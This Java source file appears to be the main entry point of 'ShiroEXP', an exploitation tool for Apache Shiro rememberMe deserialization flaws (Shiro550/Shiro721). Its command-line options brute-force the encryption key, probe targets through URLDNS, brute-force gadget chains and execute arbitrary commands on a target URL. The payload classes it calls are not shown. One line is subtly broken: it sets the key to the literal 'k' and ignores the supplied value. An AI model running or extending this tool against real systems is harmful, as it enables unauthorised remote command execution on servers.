package com.y5neko.shiroexp;

import com.y5neko.shiroexp.copyright.Copyright;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.payloads.*;
import org.apache.commons.cli.*;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws ParseException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, IOException, NoSuchFieldException, ClassNotFoundException, InterruptedException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        System.out.println(Copyright.getLogo());

        // 命令行参数解析
        Options options = getOptions();

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = parser.parse(options, args);

        // 打印帮助信息
        if (cmd.hasOption("h")) {
            HelpFormatter helpMenu =  new HelpFormatter();
            helpMenu.printHelp("java ShiroEXP.jar", options, true);
        }
        // 提供url后的逻辑处理
        else if (cmd.hasOption("u")) {
            TargetOBJ target = new TargetOBJ(cmd.getOptionValue("u"));

            // 指定携带Cookie
            if (cmd.hasOption("cookie")){
                Map<String, String> cookie = new HashMap<>();
                cookie.put("Cookie", cmd.getOptionValue("cookie"));
                target.setHeaders(cookie);
            }

            // 指定rememberMe字段名
            if (cmd.hasOption("rf")){
                target.setRememberMeFlag(cmd.getOptionValue("rf"));
            }

            // 指定key
            if (cmd.hasOption("k")){
                target.setKey("k");
            }

            // 指定gadget
            if (cmd.hasOption("gadget")){
                target.setGadget(cmd.getOptionValue("gadget").split("\\+")[0]);
                target.setEcho(cmd.getOptionValue("gadget").split("\\+")[1]);
            }

            // 指定扫描key
            if (cmd.hasOption("bk")) {
                System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在进行key爆破");
                KeyInfo keyInfo;
                // 如果指定了自定义rememberMe字段
                if (cmd.hasOption("rf")) {
                    keyInfo = BruteKey.bruteKey(target, cmd.getOptionValue("rf"));
                } else {
                    keyInfo = BruteKey.bruteKey(target);
                }
                System.out.println("[" + Tools.color("SUCC", "GREEN") + "] " + "检测到key: " + keyInfo.getKey() + ", 加密算法: " + keyInfo.getType());
            }
            // 指定漏洞扫描
            else if (cmd.hasOption("bg")) {
                if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro550")){
                    Shiro550VerifyByURLDNS.verify(target);
                } else if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro721")){
                    System.out.println("Shiro721验证");
                } else {
                    Shiro550VerifyByURLDNS.verify(target);
                    System.out.println("同时验证");
                }
            }
            // 指定爆破回显链
            else if (cmd.hasOption("be")) {
                System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在进行爆破回显链");
                List<String> vaildGadgets = BruteGadget.bruteGadget(target);
            }
            // 指定命令执行
            else if (cmd.hasOption("c")) {
                System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在进行命令执行");
                CommandExcute.commandExcute(target, cmd.getOptionValue("c"));
            }
            // 未指定操作
            else {
                System.out.println("[" + Tools.color("EROR", "RED") + "] " + "请指定模块");
            }
        }
    }

    /**
     * 获取命令行参数
     * @return Options
     */
    private static Options getOptions() {
        Options options = new Options();

        options.addOption("h", "help", false, "打印帮助");
        options.addOption("u", "url", true, "目标地址");
        options.addOption("bk", "brute-key", false, "key爆破模块 | 爆破key");
        options.addOption("rf", "rememberme-flag", true, "自定义rememberMe字段名");
        options.addOption("bg", "brute-gadget", false, "漏洞扫描模块 | 扫描漏洞");
        options.addOption("k", "key", true, "漏洞扫描模块 | 指定key");
        options.addOption("be", "brute-echo", false, "漏洞扫描模块 | 爆破回显链");
        options.addOption("e", "exp", true, "指定exp {Shiro550, Shiro721}");
        options.addOption(null, "cookie", true, "携带Cookie");
        options.addOption("c", "cmd", true, "执行命令");
        options.addOption(null, "gadget", true, "指定利用链");
        return options;
    }
}